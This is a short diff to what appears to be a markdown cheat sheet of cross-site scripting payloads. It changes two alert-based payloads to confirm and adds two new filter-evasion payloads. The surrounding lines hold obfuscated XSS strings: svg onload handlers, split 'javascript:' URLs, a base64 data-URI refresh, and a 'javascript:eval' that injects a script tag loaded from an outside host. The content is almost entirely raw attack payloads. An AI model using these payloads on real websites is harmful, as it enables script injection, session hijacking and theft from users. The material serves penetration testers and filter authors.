@@ -150,10 +150,12 @@ javascripT:eval('var a=document.createElement(\'script\'):a.src=\'https://ofjaaa
 0%3Bdata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgUE9DbCIpPC9zY3JpcHQ%22HTTP-EQUIV%3D%22refresh%22
 xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
 "-top['al\x65rt']('sailay')-"
-<div onactivate=alert('Xss') id=xss style=overflow:scroll> 
-><div onactivate=alert('Xss')> 
+<div onactivate=confirm('Xss') id=xss style=overflow:scroll> 
+><div onactivate=confirm('Xss')> 
 <a href="javas%09cript:[1].map(top['ale'+'rt'])">
 <svg/onload=location=javas+cript:ale+rt%2+81%2+9;//
+'/><img/src/onerror=confirm()>
+%E2%80%A8%E2%80%A9confirm(1)
 ```
 
 ## XSS + SSRF <br>
